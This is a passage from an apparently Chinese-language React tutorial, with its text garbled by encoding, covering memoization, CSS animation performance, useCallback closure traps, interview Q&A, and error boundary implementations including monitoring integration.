function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; data, onChange &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;å§“å&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data.name&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;v</span> =&gt;</span> onChange(&#x27;name&#x27;, v)&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      &#123;/* å…¶ä»–å­—æ®µ */&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span><br>  );<br>&#125;, <span class="hljs-function">(<span class="hljs-params">prev, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// ä»…å½“ personal éƒ¨åˆ†å˜åŒ–æ—¶é‡æ–°æ¸²æŸ“</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">shallowEqual</span>(prev.<span class="hljs-property">data</span>, next.<span class="hljs-property">data</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>åŠ¨ç”»å¡é¡¿é—®é¢˜</strong></p><p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ CSS åŠ¨ç”» + will-change</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">AnimatedBox</span> = (<span class="hljs-params">&#123; position &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;animated-box&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">transform:</span> `<span class="hljs-attr">translateX</span>($&#123;<span class="hljs-attr">position</span>&#125;<span class="hljs-attr">px</span>)`,</span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">willChange:</span> &#x27;<span class="hljs-attr">transform</span>&#x27; // <span class="hljs-attr">æç¤ºæµè§ˆå™¨ä¼˜åŒ–</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-comment">// CSS ä¸­ä½¿ç”¨ GPU åŠ é€Ÿ</span><br>.<span class="hljs-property">animated</span>-box &#123;<br>  <span class="hljs-attr">transition</span>: transform <span class="hljs-number">0.</span>3s ease-out;<br>  <span class="hljs-comment">/* å¯ç”¨ GPU åŠ é€Ÿ */</span><br>  <span class="hljs-attr">transform</span>: <span class="hljs-title function_">translateZ</span>(<span class="hljs-number">0</span>);<br>  backface-<span class="hljs-attr">visibility</span>: hidden;<br>  <span class="hljs-attr">perspective</span>: 1000px;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–åŸåˆ™æ€»ç»“"><a href="#æ€§èƒ½ä¼˜åŒ–åŸåˆ™æ€»ç»“" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–åŸåˆ™æ€»ç»“"></a>æ€§èƒ½ä¼˜åŒ–åŸåˆ™æ€»ç»“</h3><ol><li>æµ‹é‡ä¼˜å…ˆï¼šä¼˜åŒ–å‰å…ˆä½¿ç”¨ Profiler åˆ†ææ€§èƒ½ç“¶é¢ˆ</li><li>é¿å…è¿‡æ—©ä¼˜åŒ–ï¼šåªåœ¨å¿…è¦æ—¶åº”ç”¨ä¼˜åŒ–æŠ€æœ¯</li><li>å…³æ³¨å…³é”®è·¯å¾„ï¼šä¼˜å…ˆä¼˜åŒ–æ¸²æŸ“é¢‘ç‡é«˜çš„ç»„ä»¶</li><li>åˆç†ä½¿ç”¨å·¥å…·ï¼š<ol><li>React.memo ç”¨äºç»„ä»¶è®°å¿†åŒ–</li><li>useMemo ç”¨äºæ˜‚è´µè®¡ç®—ç¼“å­˜</li><li>useCallback ç”¨äºå‡½æ•°å¼•ç”¨ç¨³å®š</li></ol></li><li>ç»“æ„ä¼˜åŒ–ï¼š<ol><li>ç»„ä»¶èŒè´£å•ä¸€åŒ–</li><li>çŠ¶æ€åˆç†ä¸‹æ²‰</li><li>é¿å…æ·±å±‚åµŒå¥—</li></ol></li></ol><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£ç­”"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£ç­”" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£ç­”"></a>é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£ç­”</h3><p><strong>Qï¼šReact.memo ä¸ useMemo æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><ul><li>React.memo æ˜¯é«˜é˜¶ç»„ä»¶ï¼Œç”¨äºåŒ…è£…ç»„ä»¶ï¼Œé¿å…ä¸å¿…è¦çš„é‡æ–°æ¸²æŸ“</li><li>useMemo æ˜¯Hookï¼Œç”¨äºåœ¨ç»„ä»¶å†…éƒ¨ç¼“å­˜è®¡ç®—ç»“æœ</li><li>å‰è€…ä¼˜åŒ–ç»„ä»¶æ¸²æŸ“ï¼Œåè€…ä¼˜åŒ–è®¡ç®—æ€§èƒ½</li></ul><p><strong>Qï¼šä»€ä¹ˆæƒ…å†µä¸‹åº”è¯¥ä½¿ç”¨ useCallbackï¼Ÿ</strong></p><ul><li>å½“å‡½æ•°ä½œä¸º props ä¼ é€’ç»™è®°å¿†åŒ–ç»„ä»¶ï¼ˆReact.memoï¼‰</li><li>å½“å‡½æ•°ä½œä¸ºå…¶ä»– Hook çš„ä¾èµ–é¡¹ï¼ˆå¦‚ useEffectï¼‰</li><li>å½“å‡½æ•°åœ¨æ¸²æŸ“ä¸­è¢«åˆ›å»ºä¸”ä¾èµ–é¡¹æœªæ”¹å˜æ—¶</li></ul><p><strong>Qï¼šä¸ºä»€ä¹ˆä½¿ç”¨ useMemo&#x2F;useCallback åæ€§èƒ½åè€Œä¸‹é™ï¼Ÿ</strong></p><ul><li>è¿‡åº¦ä½¿ç”¨ï¼šç®€å•è®¡ç®—ä½¿ç”¨ useMemo å¾—ä¸å¿å¤±</li><li>ä¾èµ–é¡¹é”™è¯¯ï¼šä¾èµ–é¡¹é¢‘ç¹å˜åŒ–å¯¼è‡´é‡æ–°è®¡ç®—</li><li>æ¯”è¾ƒæˆæœ¬é«˜ï¼šè‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°å¤æ‚åº¦é«˜</li><li>é—­åŒ…é™·é˜±ï¼šå‡½æ•°é—­åŒ…æŒæœ‰æ—§å€¼å¯¼è‡´é€»è¾‘é”™è¯¯</li></ul><p><strong>Qï¼šå¦‚ä½•é¿å… useCallback çš„é—­åŒ…é™·é˜±ï¼Ÿ</strong></p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šä½¿ç”¨å‡½æ•°å¼æ›´æ–°</span><br><span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br>&#125;, []);<br><br><span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šä½¿ç”¨ ref ä¿å­˜æœ€æ–°å€¼</span><br><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);<br>countRef.<span class="hljs-property">current</span> = count;<br><br><span class="hljs-keyword">const</span> logCount = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(countRef.<span class="hljs-property">current</span>);<br>&#125;, []);<br><br><span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šæ­£ç¡®å£°æ˜ä¾èµ–é¡¹</span><br><span class="hljs-keyword">const</span> logCount = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);<br>&#125;, [count]); <span class="hljs-comment">// ä¾èµ– count</span><br></code></pre></td></tr></table></figure><h2 id="4-2-é”™è¯¯è¾¹ç•Œï¼ˆErrorBoundaryï¼‰"><a href="#4-2-é”™è¯¯è¾¹ç•Œï¼ˆErrorBoundaryï¼‰" class="headerlink" title="4.2 é”™è¯¯è¾¹ç•Œï¼ˆErrorBoundaryï¼‰"></a>4.2 é”™è¯¯è¾¹ç•Œï¼ˆErrorBoundaryï¼‰</h2><h3 id="é”™è¯¯è¾¹ç•Œæ ¸å¿ƒæ¦‚å¿µ"><a href="#é”™è¯¯è¾¹ç•Œæ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="é”™è¯¯è¾¹ç•Œæ ¸å¿ƒæ¦‚å¿µ"></a>é”™è¯¯è¾¹ç•Œæ ¸å¿ƒæ¦‚å¿µ</h3><p><strong>é”™è¯¯è¾¹ç•Œè§£å†³çš„é—®é¢˜</strong></p><pre class="mermaid">graph TD    A[ç»„ä»¶æ ‘ä¸­çš„é”™è¯¯] --> B[React 16 å‰]    A --> C[React 16+]    B --> D[æ•´ä¸ªåº”ç”¨å´©æºƒ]    C --> E[é”™è¯¯è¾¹ç•Œæ•è·]    E --> F[é™çº§UIå±•ç¤º]    E --> G[é”™è¯¯æ—¥å¿—è®°å½•]</pre><p><strong>é”™è¯¯è¾¹ç•Œèƒ½åŠ›èŒƒå›´</strong></p><table><thead><tr><th align="left">å¯æ•è·</th><th align="left">ä¸å¯æ•è·</th></tr></thead><tbody><tr><td align="left">å­ç»„ä»¶æ¸²æŸ“é”™è¯¯</td><td align="left">äº‹ä»¶å¤„ç†å™¨é”™è¯¯</td></tr><tr><td align="left">ç”Ÿå‘½å‘¨æœŸæ–¹æ³•é”™è¯¯</td><td align="left">å¼‚æ­¥ä»£ç é”™è¯¯</td></tr><tr><td align="left">æ„é€ å‡½æ•°é”™è¯¯</td><td align="left">æœåŠ¡ç«¯æ¸²æŸ“é”™è¯¯</td></tr><tr><td align="left">æ•´ä¸ªç»„ä»¶æ ‘çš„é”™è¯¯</td><td align="left">é”™è¯¯è¾¹ç•Œè‡ªèº«é”™è¯¯</td></tr></tbody></table><h3 id="é”™è¯¯è¾¹ç•Œå®ç°æœºåˆ¶"><a href="#é”™è¯¯è¾¹ç•Œå®ç°æœºåˆ¶" class="headerlink" title="é”™è¯¯è¾¹ç•Œå®ç°æœºåˆ¶"></a>é”™è¯¯è¾¹ç•Œå®ç°æœºåˆ¶</h3><p><strong>åŸºç¡€å®ç°æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span>, error &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-comment">// è®°å½•é”™è¯¯åˆ°ç›‘æ§ç³»ç»Ÿ</span><br>    <span class="hljs-title function_">logErrorToService</span>(error, errorInfo.<span class="hljs-property">componentStack</span>);<br>    <br>    <span class="hljs-comment">// å¯é€‰çš„é”™è¯¯æ¢å¤é€»è¾‘</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRecoverable</span>(error)) &#123;<br>      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;), <span class="hljs-number">5000</span>);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallback</span> || (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;error-boundary&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>åº”ç”¨é‡åˆ°é—®é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;this.state.error.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.location.reload()&#125;&gt;</span><br><span class="language-xml">            é‡æ–°åŠ è½½</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      );<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">CriticalErrorScreen</span> /&gt;</span>&#125;</span><br><span class="language-xml">    &gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainApplication</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§ç‰¹æ€§å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¸¦é”™è¯¯æ¢å¤åŠŸèƒ½çš„è¾¹ç•Œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RecoverableErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">errorInfo</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">recoveryKey</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <br>      error, <br>      errorInfo,<br>      <span class="hljs-attr">recoveryKey</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">recoveryKey</span> + <span class="hljs-number">1</span><br>    &#125;);<br>  &#125;<br>  <br>  handleReset = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">errorInfo</span>: <span class="hljs-literal">null</span> &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">error</span>) &#123;<br>      <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ç»„ä»¶å´©æºƒ<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ErrorDetails</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">error</span>=<span class="hljs-string">&#123;this.state.error&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">stack</span>=<span class="hljs-string">&#123;this.state.errorInfo.componentStack&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleReset&#125;</span>&gt;</span></span><br><span class="language-xml">            é‡ç½®ç»„ä»¶</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      );<br>    &#125;<br>    <br>    <span class="hljs-comment">// ä½¿ç”¨ key å¼ºåˆ¶é‡ç½®å­ç»„ä»¶</span><br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;this.state.recoveryKey&#125;</span>&gt;</span>&#123;this.props.children&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// é”™è¯¯è¯¦æƒ…ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ErrorDetails</span>(<span class="hljs-params">&#123; error, stack &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">whiteSpace:</span> &#x27;<span class="hljs-attr">pre-wrap</span>&#x27; &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>&#123;error.toString()&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&#123;stack&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¼ä¸šçº§æœ€ä½³å®è·µ"><a href="#ä¼ä¸šçº§æœ€ä½³å®è·µ" class="headerlink" title="ä¼ä¸šçº§æœ€ä½³å®è·µ"></a>ä¼ä¸šçº§æœ€ä½³å®è·µ</h3><p><strong>å¤šå±‚é”™è¯¯è¾¹ç•Œç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AppHierarchy</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;app&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AppCrashScreen</span> /&gt;</span>&#125;</span><br><span class="language-xml">    &gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;billing&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">BillingModuleError</span> /&gt;</span>&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">BillingDashboard</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;user-profile&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProfileError</span> /&gt;</span>&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;notifications&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;null&#125;</span> // <span class="hljs-attr">é™é»˜å¤±è´¥</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">NotificationCenter</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é”™è¯¯è¾¹ç•Œä¸ç›‘æ§ç³»ç»Ÿé›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MonitoringErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-comment">// å‘é€é”™è¯¯åˆ°ç›‘æ§å¹³å°</span><br>    monitoringClient.<span class="hljs-title function_">captureException</span>(error, &#123;<br>      <span class="hljs-attr">extra</span>: &#123;<br>        <span class="hljs-attr">componentStack</span>: errorInfo.<span class="hljs-property">componentStack</span>,<br>        <span class="hljs-attr">userId</span>: <span class="hljs-title function_">getCurrentUser</span>()?.<span class="hljs-property">id</span>,<br>        <span class="hljs-attr">route</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span><br>      &#125;,<br>      <span class="hljs-attr">tags</span>: &#123; <span class="hljs-attr">error_boundary</span>: <span class="hljs-literal">true</span> &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// è‡ªå®šä¹‰é”™è¯¯å¤„ç†</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span 